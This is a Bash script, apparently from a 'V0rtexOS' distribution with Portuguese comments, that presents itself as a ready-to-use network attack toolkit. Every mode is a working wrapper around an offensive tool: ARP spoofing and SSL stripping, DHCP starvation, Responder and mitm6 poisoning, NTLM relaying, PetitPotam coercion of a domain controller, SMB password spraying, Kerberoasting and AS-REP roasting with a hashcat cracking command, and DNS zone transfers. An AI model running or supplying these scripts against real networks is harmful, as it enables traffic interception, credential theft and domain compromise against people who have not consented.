#!/usr/bin/env bash
# V0rtexOS — Network Attack Toolkit
# Scripts de ataque de rede prontos para uso
# Uso: network-attacks.sh <modo> [args]

set -euo pipefail

RED='\033[1;31m' GRN='\033[1;32m' CYN='\033[1;36m' YEL='\033[1;33m' RST='\033[0m'
ok()  { echo -e "${GRN}[+]${RST} $*"; }
log() { echo -e "${CYN}[*]${RST} $*"; }
err() { echo -e "${RED}[!]${RST} $*"; }

# ── ARP Spoofing (MITM) ───────────────────────────
arp_spoof() {
    local target="${1:?Informe IP alvo}"
    local gateway="${2:?Informe IP gateway}"
    local iface="${3:-eth0}"
    log "Iniciando ARP Spoof: $target ↔ $gateway via $iface"
    echo 1 > /proc/sys/net/ipv4/ip_forward
    log "IP forward ativado. Iniciando arpspoof bidirecional..."
    arpspoof -i "$iface" -t "$target"  "$gateway" &
    ARPSPOOF1=$!
    arpspoof -i "$iface" -t "$gateway" "$target"  &
    ARPSPOOF2=$!
    log "PIDs: $ARPSPOOF1, $ARPSPOOF2. Ctrl+C para parar."
    trap "kill $ARPSPOOF1 $ARPSPOOF2 2>/dev/null; echo 0 > /proc/sys/net/ipv4/ip_forward" INT
    wait
}

# ── SSL Strip ─────────────────────────────────────
ssl_strip() {
    local iface="${1:-eth0}"
    local port="${2:-8080}"
    log "Ativando SSLstrip no $iface porta $port"
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port "$port"
    sslstrip -l "$port" -w /tmp/sslstrip.log -a
}

# ── DHCP Starvation ───────────────────────────────
dhcp_starvation() {
    local iface="${1:-eth0}"
    log "Iniciando DHCP Starvation em $iface (yersinia)"
    yersinia dhcp -interface "$iface" -attack 1
}

# ── Responder (LLMNR/NBT-NS/MDNS Poison) ──────────
start_responder() {
    local iface="${1:-eth0}"
    log "Iniciando Responder em $iface"
    log "Capturando NTLMv2 hashes..."
    python3 /opt/vortex/Responder/Responder.py \
        -I "$iface" \
        -rdwP \
        --lm \
        -v \
        2>&1 | tee /tmp/responder-$(date +%H%M%S).log
}

# ── NTLMRelayx (Relay de hashes NTLM) ─────────────
ntlm_relay() {
    local targets="${1:?Informe arquivo de alvos ou IP}"
    log "Iniciando NTLMRelayx → $targets"
    python3 /opt/vortex/impacket/examples/ntlmrelayx.py \
        -tf "$targets" \
        -smb2support \
        -l /tmp/loot \
        --no-http-server \
        -socks 2>&1 | tee /tmp/ntlmrelay-$(date +%H%M%S).log
}

# ── Bettercap MITM completo ────────────────────────
bettercap_mitm() {
    local iface="${1:-eth0}"
    local target="${2:-}"
    log "Iniciando Bettercap MITM em $iface"
    local cap_file
    cap_file=$(mktemp /tmp/aeternus-XXXX.cap)
    cat > "$cap_file" <<CAPLETS
set ticker.commands 'clear; net.show; events.show 10'
net.probe on
net.recon on
${target:+set arp.spoof.targets $target}
arp.spoof on
http.proxy on
https.proxy on
dns.spoof on
net.sniff on
events.stream on
CAPLETS
    bettercap -iface "$iface" -caplet "$cap_file"
}

# ── IPv6 MITM (mitm6) ─────────────────────────────
ipv6_mitm() {
    local domain="${1:?Informe o domínio (ex: corp.local)}"
    local iface="${2:-eth0}"
    log "Iniciando mitm6 — IPv6 MITM para domínio $domain"
    mitm6 -d "$domain" -i "$iface" 2>&1 | tee /tmp/mitm6-$(date +%H%M%S).log &
    log "mitm6 rodando. Inicie ntlmrelayx em paralelo."
}

# ── Coerção de autenticação (PetitPotam) ──────────
petitpotam() {
    local listener="${1:?Informe IP listener (seu IP)}"
    local target="${2:?Informe IP alvo (DC)}"
    log "PetitPotam — coerção de autenticação NTLM de $target → $listener"
    python3 /opt/cve/petitpotam/PetitPotam.py \
        "$listener" "$target" 2>&1 | tee /tmp/petitpotam-$(date +%H%M%S).log
}

# ── SMB Password Spray ────────────────────────────
smb_spray() {
    local targets="${1:?Informe arquivo de IPs}"
    local users="${2:?Informe arquivo de usuários}"
    local password="${3:?Informe senha}"
    local domain="${4:-WORKGROUP}"
    log "SMB Password Spray: $password no domínio $domain"
    netexec smb "$targets" \
        -u "$users" -p "$password" \
        -d "$domain" \
        --continue-on-success \
        2>&1 | tee "/tmp/spray-$(date +%H%M%S).txt"
}

# ── Kerberoasting ─────────────────────────────────
kerberoast() {
    local domain="${1:?Informe o domínio}"
    local dc="${2:?Informe IP do DC}"
    local user="${3:?Informe usuário}"
    local pass="${4:?Informe senha}"
    log "Kerberoasting no domínio $domain"
    python3 /opt/vortex/impacket/examples/GetUserSPNs.py \
        "$domain/$user:$pass" \
        -dc-ip "$dc" \
        -request \
        -output "/tmp/kerberoast-$(date +%H%M%S).hashes"
    ok "Hashes salvos. Quebre com: hashcat -m 13100 hashes.txt /opt/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt"
}

# ── AS-REP Roasting ───────────────────────────────
asreproast() {
    local domain="${1:?Informe o domínio}"
    local dc="${2:?Informe IP do DC}"
    log "AS-REP Roasting — usuários sem pré-autenticação"
    python3 /opt/vortex/impacket/examples/GetNPUsers.py \
        "$domain/" \
        -dc-ip "$dc" \
        -no-pass \
        -usersfile /opt/wordlists/SecLists/Usernames/top-usernames-shortlist.txt \
        -format hashcat \
        -output "/tmp/asreproast-$(date +%H%M%S).hashes"
}

# ── DNS Zone Transfer ─────────────────────────────
dns_axfr() {
    local domain="${1:?Informe o domínio}"
    local ns="${2:-}"
    log "Tentando Zone Transfer para $domain"
    if [[ -z "$ns" ]]; then
        local ns_servers
        ns_servers=$(host -t ns "$domain" | awk '{print $NF}')
        for ns in $ns_servers; do
            log "  Tentando NS: $ns"
            dig axfr "$domain" "@$ns" || true
        done
    else
        dig axfr "$domain" "@$ns"
    fi
}

# ── Banner ─────────────────────────────────────────
usage() {
    echo -e "\n${CYN}V0rtexOS — Network Attacks${RST}"
    echo
    echo "Modos disponíveis:"
    echo "  arp-spoof    <target> <gateway> [iface]"
    echo "  ssl-strip    [iface] [port]"
    echo "  dhcp-starve  [iface]"
    echo "  responder    [iface]"
    echo "  ntlm-relay   <targets_file>"
    echo "  bettercap    [iface] [target_ip]"
    echo "  ipv6-mitm    <domain> [iface]"
    echo "  petitpotam   <listener_ip> <target_ip>"
    echo "  smb-spray    <targets_file> <users_file> <password> [domain]"
    echo "  kerberoast   <domain> <dc_ip> <user> <pass>"
    echo "  asreproast   <domain> <dc_ip>"
    echo "  dns-axfr     <domain> [ns_ip]"
    echo
}

case "${1:-help}" in
    arp-spoof)   shift; arp_spoof "$@" ;;
    ssl-strip)   shift; ssl_strip "$@" ;;
    dhcp-starve) shift; dhcp_starvation "$@" ;;
    responder)   shift; start_responder "$@" ;;
    ntlm-relay)  shift; ntlm_relay "$@" ;;
    bettercap)   shift; bettercap_mitm "$@" ;;
    ipv6-mitm)   shift; ipv6_mitm "$@" ;;
    petitpotam)  shift; petitpotam "$@" ;;
    smb-spray)   shift; smb_spray "$@" ;;
    kerberoast)  shift; kerberoast "$@" ;;
    asreproast)  shift; asreproast "$@" ;;
    dns-axfr)    shift; dns_axfr "$@" ;;
    *)           usage ;;
esac
